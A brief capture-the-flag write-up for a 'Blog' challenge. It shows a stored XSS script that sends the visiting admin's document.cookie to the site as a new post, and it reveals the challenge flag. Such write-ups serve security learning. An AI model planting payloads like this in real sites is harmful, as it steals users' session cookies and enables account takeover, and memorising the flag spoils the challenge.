# Blog
We know that the admin visits the page every minute, so we give him a javascript:
```js
<script>
var req = new XMLHttpRequest();
req.open('post','/create',false);
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
req.send('title=kvakk&body='+document.cookie);
</script>
```
And after a little while we get a new post with the flag: `EPT{I_never_sleep}`

I'm not sure if the cookie-thing worked, or if the admin-script is forgiving, but a flag is a flag.


